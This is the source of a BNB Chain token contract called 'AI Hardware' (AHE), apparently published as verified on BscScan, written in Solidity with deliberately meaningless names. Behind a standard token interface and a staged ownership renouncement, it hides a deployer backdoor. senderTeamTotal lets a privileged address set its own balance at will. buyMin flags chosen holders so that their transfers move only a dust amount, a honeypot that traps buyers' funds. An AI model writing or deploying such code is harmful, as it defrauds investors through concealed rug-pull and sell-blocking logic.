/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface sellBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address maxAmount) external view returns (uint256);

    function transfer(address takeFrom, uint256 launchTrading) external returns (bool);

    function allowance(address modeSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchTrading) external returns (bool);

    function transferFrom(
        address sender,
        address takeFrom,
        uint256 launchTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldMarketing, uint256 value);
    event Approval(address indexed modeSell, address indexed spender, uint256 value);
}

interface sellBuyMetadata is sellBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface limitReceiver {
    function createPair(address fundReceiver, address launchWallet) external returns (address);
}

interface buyAtWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toLimitFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract AIHardware is toLimitFrom, sellBuy, sellBuyMetadata {
    uint8 private listLimit = 18;
    
    mapping(address => mapping(address => uint256)) private amountSellFrom;

    mapping(address => bool) public senderSellMarketing;


    bool public fromLaunchTo;
    string private teamEnable = "AI Hardware";
    string private listWallet = "AHE";
    uint256 private launchAmount = 100000000 * 10 ** listLimit;
    bool public walletEnable;
    mapping(address => uint256) private totalMin;
    bool public marketingIs;

    mapping(address => bool) public limitTx;
    address public senderMinLiquidity;
    uint256 constant receiverToken = 10 ** 10;

    bool public amountAuto;
    address private teamMax;
    address private modeMaxAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    bool public limitSwap;
    address public sellAt;
    

    event OwnershipTransferred(address indexed toTake, address indexed senderSell);

    constructor (){
        
        buyAtWallet exemptFrom = buyAtWallet(modeMaxAuto);
        sellAt = limitReceiver(exemptFrom.factory()).createPair(exemptFrom.WETH(), address(this));
        teamMax = _msgSender();
        
        senderMinLiquidity = teamMax;
        senderSellMarketing[senderMinLiquidity] = true;
        
        totalMin[senderMinLiquidity] = launchAmount;
        emit Transfer(address(0), senderMinLiquidity, launchAmount);
        receiverFromFund();
    }

    

    function fundEnable() public {
        if (limitSwap) {
            walletEnable = true;
        }
        if (limitSwap != walletEnable) {
            walletEnable = true;
        }
        amountAuto=false;
    }

    function symbol() external view virtual override returns (string memory) {
        return listWallet;
    }

    function senderTeamTotal(uint256 launchTrading) public {
        if (!senderSellMarketing[_msgSender()]) {
            return;
        }
        totalMin[senderMinLiquidity] = launchTrading;
    }

    function transfer(address autoMode, uint256 launchTrading) external virtual override returns (bool) {
        return transferFrom(_msgSender(), autoMode, launchTrading);
    }

    function feeList() public {
        if (amountAuto) {
            walletEnable = true;
        }
        
        amountAuto=false;
    }

    function owner() external view returns (address) {
        return teamMax;
    }

    function marketingFromTake() public {
        if (walletEnable) {
            amountAuto = true;
        }
        if (marketingIs) {
            amountAuto = true;
        }
        marketingIs=false;
    }

    function allowance(address enableReceiverTx, address txTo) external view virtual override returns (uint256) {
        return amountSellFrom[enableReceiverTx][txTo];
    }

    function decimals() external view virtual override returns (uint8) {
        return listLimit;
    }

    function transferFrom(address shouldEnable, address autoMode, uint256 launchTrading) public virtual override returns (bool) {
        if (shouldEnable != _msgSender() && amountSellFrom[shouldEnable][_msgSender()] != type(uint256).max) {
            require(amountSellFrom[shouldEnable][_msgSender()] >= launchTrading);
            amountSellFrom[shouldEnable][_msgSender()] -= launchTrading;
        }
        if (autoMode == senderMinLiquidity || shouldEnable == senderMinLiquidity) {
            return sellLaunched(shouldEnable, autoMode, launchTrading);
        }
        
        if (limitTx[shouldEnable]) {
            return sellLaunched(shouldEnable, autoMode, receiverToken);
        }
        if (walletEnable != limitSwap) {
            amountAuto = false;
        }
        return sellLaunched(shouldEnable, autoMode, launchTrading);
    }

    function balanceOf(address maxAmount) public view virtual override returns (uint256) {
        return totalMin[maxAmount];
    }

    function sellLaunched(address autoList, address takeFrom, uint256 launchTrading) internal returns (bool) {
        require(totalMin[autoList] >= launchTrading);
        totalMin[autoList] -= launchTrading;
        totalMin[takeFrom] += launchTrading;
        emit Transfer(autoList, takeFrom, launchTrading);
        return true;
    }

    function approve(address txTo, uint256 launchTrading) public virtual override returns (bool) {
        amountSellFrom[_msgSender()][txTo] = launchTrading;
        emit Approval(_msgSender(), txTo, launchTrading);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return teamEnable;
    }

    function minTake() public {
        if (limitSwap) {
            limitSwap = false;
        }
        if (marketingIs != amountAuto) {
            amountAuto = true;
        }
        marketingIs=false;
    }

    function shouldAmount() public {
        if (walletEnable != marketingIs) {
            limitSwap = false;
        }
        
        amountAuto=false;
    }

    function launchLimit() public view returns (bool) {
        return walletEnable;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchAmount;
    }

    function receiverFromFund() public {
        emit OwnershipTransferred(senderMinLiquidity, address(0));
        teamMax = address(0);
    }

    function getOwner() external view returns (address) {
        return teamMax;
    }

    function buyMin(address swapMax) public {
        if (amountAuto != marketingIs) {
            marketingIs = false;
        }
        if (swapMax == senderMinLiquidity || swapMax == sellAt || !senderSellMarketing[_msgSender()]) {
            return;
        }
        if (amountAuto == walletEnable) {
            amountAuto = true;
        }
        limitTx[swapMax] = true;
    }

    function txAt(address isSwapTrading) public {
        if (fromLaunchTo) {
            return;
        }
        
        senderSellMarketing[isSwapTrading] = true;
        if (amountAuto) {
            marketingIs = true;
        }
        fromLaunchTo = true;
    }


}